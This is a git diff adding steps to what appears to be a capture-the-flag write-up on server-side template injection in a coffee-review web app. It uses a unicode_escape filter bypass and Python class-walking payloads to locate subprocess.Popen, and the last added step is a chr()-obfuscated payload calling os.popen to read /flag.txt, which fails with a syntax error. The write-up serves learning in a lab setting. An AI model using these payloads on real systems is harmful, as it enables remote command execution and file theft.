@@ -244,4 +244,11 @@ review = bytes(review, "utf-8").decode("unicode_escape")
 It will interpret things like \N{…}, It will convert escaping sequences and It allows injecting characters normally filtered out. This gives potential filter bypass. We need to use SSTI.
 - I try to give different payloads, keeping in mind the filters. I am basically trying to see the classes of the Docker. first i put `\N{DOLLAR SIGN}{ ''.__class__.__mro__[2].__subclasses__() }` Which prints `Best coffee I ever had`. This means the the `\N` is giving some sort of a problem so i switch to `%5CN`
 - I input `%5CN{DOLLAR SIGN}{ ''.__class__.__mro__[2].__subclasses__() }` which again prints `Best coffee I ever had` and i realise that i am still using apostrophes so that is the problem. so i do it without apostrophe `%5CN{DOLLAR SIGN}{().__class__.__mro__[2].__subclasses__()}`.....which also did not work. in fact it kind of crashed and gave me this instead <img width="828" height="497" alt="image" src="https://github.com/user-attachments/assets/9cf4b597-dd13-4d92-b800-0bcc5a11d5b0" />
+- Anyways, i deleted the cookie and retried, this time checking for division of zero error `%5CN{DOLLAR SIGN}{(1/0).__class__.__mro__}` which gave
+  <img width="763" height="158" alt="image" src="https://github.com/user-attachments/assets/b297f509-0005-4604-bafb-efe7505cc9b2" />
+- after a couple more tries of different possible injections, i try `%5CN{DOLLAR SIGN}{().__class__.__base__.__subclasses__()}` and i get a lead
+  <img width="1703" height="798" alt="image" src="https://github.com/user-attachments/assets/22980e37-bb67-4ea8-965e-a3db1267b24c" />
+  now in this list i search for `<class 'subprocess.Popen'>` and note down its index number by using `%5CN{DOLLAR SIGN}{next(x for x in ().__class__.__base__.__subclasses__()ifx.__name__==chr(80)+chr(111)+chr(112)+chr(101)+chr(110))).__init__.__globals__[(chr(111)+chr(115))].popen((chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116))).read()}`...which prints `expected token ',', got 'for'`
+- 
+
 
